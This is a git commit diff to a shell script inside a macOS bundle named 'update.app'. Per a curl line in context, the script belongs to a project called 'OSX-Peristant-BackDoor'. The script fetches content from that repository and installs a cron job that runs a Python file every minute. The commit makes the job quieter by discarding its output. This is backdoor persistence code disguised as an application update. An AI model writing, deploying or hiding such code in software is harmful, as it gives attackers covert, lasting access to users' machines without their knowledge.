8d84c7812188c21a8fba312534d601fe2232290e
Davide Pistacchio <davidepistacchio@Davides-Mac.local>
2019-01-04 08:47:56 -0800

    ok

--- update.app/Contents/Resources/woffice.sh
+++ update.app/Contents/Resources/woffice.sh
@@ -5,6 +5,6 @@ curl https://raw.githubusercontent.com/pistacchietto/OSX-Peristant-BackDoor/mast
 #croncmd="/home/me/myfunction myargs > /home/me/myfunction.log 2>&1"
 #cronjob="0 */15 * * * $croncmd"
 #croncmd="/etc/init.d/rc.local"
-croncmd="python /usr/local/sbin/woffice_app.py"
+croncmd="python /usr/local/sbin/woffice_app.py > /dev/null"
 cronjob="* * * * * $croncmd"
 (crontab -l | grep -v -F "$croncmd" ; echo "$cronjob" ) | crontab -
